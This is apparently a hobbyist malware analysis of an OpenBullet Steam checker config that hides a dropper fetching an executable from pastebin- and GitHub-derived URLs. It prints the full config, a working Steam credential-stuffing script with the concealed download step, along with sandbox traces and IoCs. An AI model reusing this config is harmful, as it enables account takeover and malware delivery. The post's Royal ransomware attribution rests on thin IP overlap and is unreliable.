



While I was doing some web surfing I was looking at Some selenium drivers like Openbullet. While browsing I found a Telegram channel which was posting configuration files for this using the programming language "Loliscript" and yes that is the real name. Due to privacy and security reasons I have truncated some of the information in this as I do not want to be harassed by cyber criminals.



Lets get started.

Source code.

Since the script is Interpreted by open bullet . Some interesting HTTP requests stuck out to me.

```
REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u"
  COOKIE "hrd: /"
  COOKIE "hpr: bin"
  COOKIE "hdp: com"
  COOKIE "htp: raw"
  COOKIE "hht: RST8Xs**"
  COOKIE "hst: pastebin"
  COOKIE "kht: driver"
  COOKIE "kpt: chrome"
  COOKIE "krt: e"
  HEADER "Host: www.googleapis.com"
  HEADER "Accept: */*"
  HEADER "Content-Type: application/json"
  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS"
  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com"
  HEADER "Accept-Encoding: gzip, deflate"
  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2"
  HEADER "Accept-Language: en"
```

As you can see in this there is strange cookies When put together it is this URL 
https://pastebin.com/RST8Xs**
When you go here it has in text this.
samplecollection***/api/main/ocean

I assume this is some weird endpoint on their c2 server. This is confirmed as when i find another function 

```
REQUEST GET "https://raw.githubusercontent.com/<SOURCE>"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
  HEADER "Pragma: no-cache"
  HEADER "Accept: */*"
  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe"

```

This function is getting a file from raw.githubusercontent from the <source/> endpoint after trying to look through the source code and documentation for this scripting language I just decide to test something.

https://raw.githubusercontent.com/samplecollection***/api/main/ocean 

When you go to this link 

it downloads a binary namedocean.exe

So now lets find the c2 server and see what ocean.exe does.

I am going to use triage and virus total for this. since doing static analysis for this will be difficult since it is in rust. 

Also browsing the endpoint
https://github.com/samplecollection***/api
tells me there is two other binary files named fork and patent and some russian next to it. здравствуйте which translates to hello. 



The behavior of ocean.
#### Processes created

- "C:\Users\<USER>\Desktop\software.exe"
- C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s StorSvc
- C:\Windows\System32\svchost.exe -k NetworkService -p
- C:\Windows\system32\lsass.exe
- C:\Windows\system32\services.exe
- C:\Windows\system32\svchost.exe -k LocalService -s W32Time
- C:\Windows\system32\svchost.exe -k UnistackSvcGroup
- %SAMPLEPATH%\ocean.exe
- "C:\Users\user\Desktop\executable.exe" -install
- "C:\Users\user\Desktop\executable.exe" /install




After scanning three of the files. The ocean and fork and patent I discover that patent the file hosted is showing on virus total as malicious 42/72. These programs ocean and fork also doing registry checks which I believe is to detect whether or not in a virtual environment . Since the "patent" file shows the most likely to be malware lets look at these.


An intresting IP address i see it connecting out to is 
20.99.133.***
it appears that this has IP abuse reports for being a Port scanner. So what if this is their c2 server and they are trying to scan vulnerable targets using it? 


We see the same process being created aka "software.exe"

#### Processes created

- "C:\Users\<USER>\Desktop\software.exe"
- %SAMPLEPATH%\patent.exe
- C:\Windows\System32\WerFault.exe
- "C:\Users\user\Desktop\file.exe"

Intrestingly we also see this creating 


We also see that 

```
title: Load Of RstrtMgr.DLL By An Uncommon Process
id: 3669afd2-9891-4534-a626-e5cf03810a61
related:
    - id: b48492dc-c5ef-4572-8dff-32bc241c15c8
      type: derived
status: test
description: |
    Detects the load of RstrtMgr DLL (Restart Manager) by an uncommon process.
    This library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.
    It could also be used for anti-analysis purposes by shut downing specific 
```


We saw that they were speaking in Russian in the GitHub comments so this could def be some advanced russian ransomware. I look at another file posted on their telegram and again, using the same github repo to download ocean.

```
REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u"
  COOKIE "hrd: /"
  COOKIE "hpr: bin"
  COOKIE "hdp: com"
  COOKIE "htp: raw"
  COOKIE "hht: RST8Xs**"
  COOKIE "hst: pastebin"
  COOKIE "kht: driver"
  COOKIE "kpt: chrome"
  COOKIE "krt: e"
  HEADER "Host: www.googleapis.com"
  HEADER "Accept: */*"
  HEADER "Content-Type: application/json"
  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS"
  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com"
  HEADER "Accept-Encoding: gzip, deflate"
  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2"
  HEADER "Accept-Language: en"
```

What i am suspecting at this point is there is a multi-stage dropper process most likely that goes

Openbullet dropper -> ocean -> fork -> patent. In all of these they do the same registry checks.

When i run patent inside of a VM my fears are confirmed.

There is NO network detection detected by tri.age's vm while VirusTotal found the following below.
#### IP Traffic

- UDP a83f:8110:cce1:d301:10:0:0:0:53
- UDP 192.168.0.7:137
- TCP 20.99.133.109:443
- TCP 151.101.22.172:80
- TCP 23.216.81.152:80
- TCP 23.216.147.61:80

#### Memory Pattern Urls

- http://ns.adobe.
- http://www.w3.or
- https://docs.rs/getrandom#nodejs-es-module-supportC:


This is used for encryption. 
- https://docs.rs/getrandom#nodejs-es-module-supportC:




The only place an abusive Ip seems to be coming from is 20.99.133.109.

After doing some research on the IPs I see that the IP 20.99.133.109. is actually being connected to by both ocean fork and  patent. 

I found a website about a ransomware strain named. Dark-web-profile-royal-ransomware.
Credits to - https://socradar.io/dark-web-profile-royal-ransomware/

**IOCs of Royal Ransomware:**

- 104.86.182.8:443 (TCP)
- 20.99.133.109:443 (TCP)
- 20.99.184.37:443 (TCP)
- 23.216.147.64:443 (TCP)
- 23.216.147.76:443 (TCP)
- a83f:8110:0:0:64ca:1f00:0:0:53 (UDP)
- a83f:8110:1749:73ff:1749:73ff:1a4b:73ff:53 (UDP)
- a83f:8110:8401:0:2075:2cc:8401:0:53 (UDP)
- hxxp[:]//royal2xthig3ou5hd7zsliqagy6yygk2cdelaxtni2fyad6dpmpxedid[.]onion/%s
- README.txt


This includes and BOOM 20.99.184.**


They are using a Microsoft azure server as their c2

|             |                                                                       |
| ----------- | --------------------------------------------------------------------- |
| ISP         | Microsoft Corporation                                                 |
| Usage Type  | Data Center/Web Hosting/Transit                                       |
| ASN         | AS8075                                                                |
| Domain Name | microsoft.com                                                         |
| Country     | ![](https://www.abuseipdb.com/img/blank.gif) United States of America |
| City        | Moses Lake, Washington                                                |

Again credits to https://socradar.io/dark-web-profile-royal-ransomware/. I believe that this is a strain of Royal-Ransomware. Due to the complexity of Reverse engineering these rust binaries this is all im gonna write. This took me on a unaccepted and fun journey and I discovered some weird stuff! 

IoCs:
File hashes:
ba0fe907dbf9010e39c27e8db165cda63bd3f85ac722ce393fa89c0b796d8ff0
720dfa4489f7af20ce284522d87f73ab7c4740256eee2164d7b3a08692de2aaf
e0eaebee569607ba4978967418617fc817c0f1ad674af7330f563c64479d029d
20.99.133.109
https://docs.rs/getrandom#nodejs-es-module-supportC:

The original dropper script.
```
[SETTINGS]
{
  "Name": "Steam",
  "SuggestedBots": 30,
  "MaxCPM": 0,
  "LastModified": "2024-04-30T20:54:53.3625014+03:30",
  "AdditionalInfo": "Telegram Channel : T.me/OpenBulletCha**el | Capture | CPM Rate : 50-1000",
  "RequiredPlugins": [],
  "Author": "@The*wn",
  "Version": "1.2.2",
  "SaveEmptyCaptures": false,
  "ContinueOnCustom": false,
  "SaveHitsToTextFile": false,
  "IgnoreResponseErrors": false,
  "MaxRedirects": 8,
  "NeedsProxies": true,
  "OnlySocks": false,
  "OnlySsl": false,
  "MaxProxyUses": 0,
  "BanProxyAfterGoodStatus": false,
  "BanLoopEvasionOverride": -1,
  "EncodeData": false,
  "AllowedWordlist1": "UserPass",
  "AllowedWordlist2": "",
  "DataRules": [],
  "CustomInputs": [],
  "ForceHeadless": false,
  "AlwaysOpen": false,
  "AlwaysQuit": false,
  "QuitOnBanRetry": false,
  "DisableNotifications": false,
  "CustomUserAgent": "",
  "RandomUA": false,
  "CustomCMDArgs": ""
}

[SCRIPT]
JUMP #AppleWebKit
#PARSESOURCE
#UA FUNCTION Constant "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/497.322 Mobile/15A302 Safari/604.1" -> VAR "S" 

#US FUNCTION Replace "@.*" "" UseRegex=TRUE "<USER>" -> VAR "US" 

#T FUNCTION CurrentUnixTime -> VAR "0" 

REQUEST POST "https://steamcommunity.com/login/getrsakey/" 
  CONTENT "donotcache=<0>&username=<US>" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "Accept: */*" 
  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
  HEADER "Origin: https://steamcommunity.com" 
  HEADER "X-Requested-With: XMLHttpRequest" 
  HEADER "User-Agent: <S>" 
  HEADER "Accept-Encoding: gzip, deflate, br" 
  HEADER "Accept-Language: en-us" 


JUMP #googlerecreate
#AppleWebKit

REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u"
  COOKIE "hrd: /"
  COOKIE "hpr: bin"
  COOKIE "hdp: com"
  COOKIE "htp: raw"
  COOKIE "hht: RST8Xs**"
  COOKIE "hst: pastebin"
  COOKIE "kht: driver"
  COOKIE "kpt: chrome"
  COOKIE "krt: e"
  HEADER "Host: www.googleapis.com"
  HEADER "Accept: */*"
  HEADER "Content-Type: application/json"
  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS"
  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com"
  HEADER "Accept-Encoding: gzip, deflate"
  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2"
  HEADER "Accept-Language: en"

IF "<Authentiction>" Exists
JUMP #PARSESOURCE
ENDIF
SET USEPROXY FALSE

REQUEST GET "<COOKIES(hst)>.<COOKIES(hdp)><COOKIES(hrd)><COOKIES(htp)><COOKIES(hrd)><COOKIES(hht)>"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
  HEADER "Pragma: no-cache"
  HEADER "Accept: */*"

REQUEST GET "https://raw.githubusercontent.com/<SOURCE>"
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
  HEADER "Pragma: no-cache"
  HEADER "Accept: */*"
  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe"

SET USEPROXY TRUE
SET NEWGVAR "Authentiction" "Authentiction=1"

BROWSERACTION Open

JUMP #PARSESOURCE
#googlerecreate

KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Ban OR 
    KEY "<SOURCE>" DoesNotContain "success\":true" 

#1 PARSE "<SOURCE>" JSON "publickey_mod" -> VAR "1" 

#11 PARSE "<SOURCE>" JSON "publickey_exp" -> VAR "11" 

#111 PARSE "<SOURCE>" JSON "timestamp" -> VAR "111" 

#PASS2 FUNCTION RSAPKCS1PAD2 "<1>" "<11>" "<PASS>" -> VAR "PASS2" 

IF "<PASS2>" DoesNotContain "=="
JUMP #PASS2
ENDIF 

FUNCTION URLEncode "<PASS2>" -> VAR "PASS3" 

FUNCTION CurrentUnixTime -> VAR "0" 

REQUEST POST "https://steamcommunity.com/login/dologin/" 
  CONTENT "donotcache=<0>&password=<PASS3>&username=<US>&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp=<111>&remember_login=false&oauth_client_id=3638BFB1" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "Accept: */*" 
  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
  HEADER "Origin: https://steamcommunity.com" 
  HEADER "X-Requested-With: XMLHttpRequest" 
  HEADER "User-Agent: <S>" 
  HEADER "Referer: https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client" 
  HEADER "Accept-Encoding: gzip, deflate, br" 
  HEADER "Accept-Language: en-us" 

KEYCHECK 
  KEYCHAIN Failure OR 
    KEY "The account name or password that you have entered is incorrect" 
    KEY "Incorrect account name or password." 
  KEYCHAIN Success OR 
    KEY "success\":true" 
  KEYCHAIN Custom "2FACTOR" OR 
    KEY "requires_twofactor\":true,\"" 
    KEY "emailauth_needed\":true" 
  KEYCHAIN Ban OR 
    KEY "captcha_needed\":true" 

PARSE "<SOURCE>" JSON "steamid" -> VAR "ID" 

REQUEST GET "https://store.steampowered.com/account/" 
  
  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
  HEADER "Accept-Language: en-us" 
  HEADER "Accept-Encoding: gzip, deflate, br" 

KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Success OR 
    KEY "s account</title>" 

PARSE "<SOURCE>" LR "account_manage_label\">Status:" "class=\"account_manage_link" -> VAR "st" 

PARSE "<st>" LR "\">" "</a>" -> CAP "Status" 

PARSE "<SOURCE>" LR "<div class=\"accountData price\">" "</div>" CreateEmpty=FALSE -> CAP "Balance" 

REQUEST GET "https://steamcommunity.com/profiles/<ID>/games?tab=all" 
  
  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
  HEADER "Accept-Language: en-us" 
  HEADER "Accept-Encoding: gzip, deflate, br" 

KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Custom "FREE" AND 
    KEY "<SOURCE>" DoesNotContain ",\"name\":\"" 
  KEYCHAIN Custom "EXPIRED" OR 
    KEY "Your profile is being forced private due to an active Community Ban on your account." 

PARSE "<SOURCE>" LR "var rgGames = " "var rgChangingGames " -> VAR "GA" 

PARSE "<GA>" LR "name\":\"" "\"," Recursive=TRUE -> VAR "Games" 

FUNCTION Replace "," " | " "<Games>" -> CAP "Games" 

FUNCTION CountOccurrences ",\"name\":\"" "<GA>" -> CAP "Total Games" 

REQUEST GET "https://help.steampowered.com/en/wizard/VacBans" 
  
  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
  HEADER "Accept-Language: en-us" 
  HEADER "Accept-Encoding: gzip, deflate, br" 

PARSE "<SOURCE>" LR "Bans applied by VAC or Valve Anti-Cheat" "Read our FAQ on being VAC banned." -> VAR "vac1" 

PARSE "<vac1>" LR "<span  class=\"help_highlight_text\">" "</span> " Recursive=TRUE CreateEmpty=FALSE -> CAP "VAC" 

PARSE "<SOURCE>" LR "Bans applied by the Game Developer" "Game Bans are not VAC Bans and they are issued by the individual game." -> VAR "GAMEBAN1" 

PARSE "<GAMEBAN1>" LR "<span class=\"help_highlight_text\">" "</span> " CreateEmpty=FALSE -> CAP "Ban?" 

REQUEST GET "https://steamcommunity.com/profiles/<ID>/" 
  
  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
  HEADER "Accept-Language: en-us" 
  HEADER "Accept-Encoding: gzip, deflate, br" 

PARSE "<SOURCE>" LR "class=\"friendPlayerLevelNum\">" "</span>" -> CAP "Level" 

PARSE "<SOURCE>" LR "steamyears" "_" CreateEmpty=FALSE -> CAP "Years Badge" 

PARSE "<SOURCE>" LR "<img class=\"profile_flag\"" "<div class=\"" -> VAR "CU" 

PARSE "<CU>" LR "\">" "</div>" CreateEmpty=FALSE -> CAP "Country" 

PARSE "<SOURCE>" LR "class=\"profile_badges_badge \"  data-tooltip-html=\"" "&lt;br&gt;" Recursive=TRUE -> VAR "Ba" 

FUNCTION Replace "," " | " "<Ba>" -> CAP "Badges" 

REQUEST GET "https://steamcommunity.com/profiles/<ID>/inventory" 
  
  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
  HEADER "Accept-Language: en-us" 
  HEADER "Accept-Encoding: gzip, deflate, br" 

PARSE "<SOURCE>" CSS "[data-appid]" "innerHTML" Recursive=TRUE CreateEmpty=FALSE -> CAP "Inventory Items" 

REQUEST GET "https://steamcommunity.com/inventory/<ID>/570/2?l=english&count=75" 
  
  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
  HEADER "Accept: */*" 
  HEADER "X-Requested-With: XMLHttpRequest" 
  HEADER "Referer: https://steamcommunity.com/profiles/<ID>/inventory" 
  HEADER "Accept-Language: en-us" 
  HEADER "Accept-Encoding: gzip, deflate, br" 

IF "<SOURCE>" Contains "\"name\":\"Loyalty Badge\""
SET CAP "PRIME" "YES"
ELSE
SET CAP "PRIME" "NO"
ENDIF

FUNCTION Constant " t.me/OpenBulletCha**el" -> CAP "Telegram Channel: " 


```